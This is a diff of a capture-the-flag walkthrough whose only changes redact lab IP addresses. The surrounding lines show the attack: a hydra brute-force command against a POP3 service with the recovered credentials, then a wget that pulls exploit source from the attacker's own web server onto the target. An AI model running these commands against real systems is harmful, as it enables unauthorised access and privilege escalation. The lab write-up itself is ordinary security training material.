@@ -30,7 +30,7 @@ username -> boris  //not Boris
 
 
 ı tryed brute force attack to pop3 server
-hydra -L users.txt -P fasttrack.txt pop3://10.0.2.23:55007 
+hydra -L users.txt -P fasttrack.txt pop3://10.X.X.X:55007 
 
 [55007][pop3] host: 10.X.X.X   login: boris   password: secret1!
 
@@ -318,7 +318,7 @@ lets open service -> service apache2 start
 
 and download from our apache2 service
 
-tmp$ wget http://10.0.2.15/37292.c
+tmp$ wget http://10.X.X.X/37292.c
 
 
 gcc 37292.c   -> The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
@@ -360,7 +360,7 @@ If you captured this make sure to go here.....
 
 |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 
-lets check out web site ->http://10.0.2.23//006-final/xvf7-flag/
+lets check out web site ->http://10.X.X.X//006-final/xvf7-flag/
 
 
 finally done... :)
